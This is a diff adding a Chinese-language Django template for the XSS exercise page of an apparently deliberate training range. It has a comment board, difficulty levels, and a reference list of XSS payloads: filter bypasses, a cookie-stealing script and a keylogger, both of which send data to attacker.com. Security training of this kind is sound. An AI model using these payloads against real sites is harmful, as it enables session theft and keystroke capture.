@@ -1,0 +1,107 @@
+{% extends "base.html" %}
+{% block title %}XSS 跨站脚本 - XinRange{% endblock %}
+
+{% block content %}
+<a href="/" class="back-link">← 返回首页</a>
+
+<div class="card">
+    <div class="card-title">⚡ XSS 跨站脚本攻击</div>
+    <div class="card-desc">
+        漏洞原理：Web应用对用户输入未做充分过滤或转义，导致恶意 JavaScript 代码被浏览器执行。<br>
+        常见类型：<strong>反射型</strong>（URL参数触发）、<strong>存储型</strong>（入库后长期生效）、<strong>DOM型</strong>（纯前端解析）。
+    </div>
+</div>
+
+<!-- 难度选择 -->
+<div class="difficulty-bar">
+    <span>难度：</span>
+    <a href="?level=low"><button class="diff-btn low {% if difficulty == 'low' %}active{% endif %}">🔵 Low</button></a>
+    <a href="?level=medium"><button class="diff-btn medium {% if difficulty == 'medium' %}active{% endif %}">🟡 Medium</button></a>
+    <a href="?level=high"><button class="diff-btn high {% if difficulty == 'high' %}active{% endif %}">🔴 High</button></a>
+</div>
+
+<!-- 留言板 -->
+<div class="card">
+    <div class="card-title">📝 留言板</div>
+    <form method="post" action="/vulns/xss/post/?level={{ difficulty }}">
+        {% csrf_token %}
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
+            <div>
+                <label style="font-size:13px;color:var(--muted);display:block;margin-bottom:4px;">昵称</label>
+                <input type="text" name="username" placeholder="你的昵称" required>
+            </div>
+            <div>
+                <label style="font-size:13px;color:var(--muted);display:block;margin-bottom:4px;">内容</label>
+                <input type="text" name="content" placeholder="说点什么..." required>
+            </div>
+        </div>
+        <button type="submit" class="btn btn-primary" style="margin-top:8px;">发表评论</button>
+    </form>
+
+    <div style="margin-top:20px;">
+        <strong style="font-size:13px;color:var(--muted);">历史留言：</strong>
+        {% if comments %}
+        <table style="margin-top:8px;">
+            <thead><tr><th>昵称</th><th>内容</th><th>时间</th></tr></thead>
+            <tbody>
+            {% for c in comments %}
+            <tr>
+                <td>{{ c.username }}</td>
+                <td>{{ c.content }}</td>
+                <td style="color:var(--muted);font-size:12px;">{{ c.created_at|date:"Y-m-d H:i" }}</td>
+            </tr>
+            {% endfor %}
+            </tbody>
+        </table>
+        {% else %}
+        <div class="alert alert-warn" style="margin-top:8px;">暂无留言，发表第一条吧。</div>
+        {% endif %}
+    </div>
+</div>
+
+<!-- 参考 Payload -->
+<div class="card">
+    <div class="card-title">XSS 参考 Payload</div>
+    <div class="card-desc">
+        <pre># 基础弹框测试
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert('XSS')&gt;
+&lt;body onload=alert(1)&gt;
+&lt;iframe src="javascript:alert('XSS')"&gt;
+
+# 绕过过滤 - 大小写混合
+&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+&lt;IMG SRC=j&#97;vascript:alert('XSS')&gt;
+
+# 绕过引号过滤
+&lt;img src=x onerror=alert(String.fromCharCode(88,83,83))&gt;
+&lt;a href="javascript:alert('XSS')"&gt;click&lt;/a&gt;
+
+# 绕过 &lt;script&gt; 过滤
+&lt;img src="x:alert" onerror="eval(atob('YWxlcnQoJ1hTUycp'))"&gt;
+&lt;details open ontoggle=alert(1)&gt;
+&lt;marquee onstart=alert('XSS')&gt;
+
+# 钓鱼/窃取Cookie（演示用）
+&lt;script&gt;document.location='http://attacker.com/steal?c='+document.cookie&lt;/script&gt;
+
+# Keylogger
+&lt;script&gt;document.onkeypress=function(e){new Image().src='http://attacker.com/log?k='+e.key}&lt;/script&gt;</pre>
+    </div>
+</div>
+
+{% if difficulty == 'low' %}
+<div class="alert alert-danger">
+    ⚠️ 当前为 Low 难度，留言内容<strong>不过滤直接入库和输出</strong>，存储型XSS直接生效。
+</div>
+{% elif difficulty == 'medium' %}
+<div class="alert alert-warn">
+    ⚠️ Medium 难度存在过滤，但仍可被绕过。试试大小写混合如 <code>&lt;ScRiPt&gt;</code>。
+</div>
+{% else %}
+<div class="alert alert-success">
+    ✅ High 难度使用 HTML 转义，基础 XSS 无效。但 DOM 型 XSS 仍可能存在，尝试在前端 JS 寻找注入点。
+</div>
+{% endif %}
+{% endblock %}
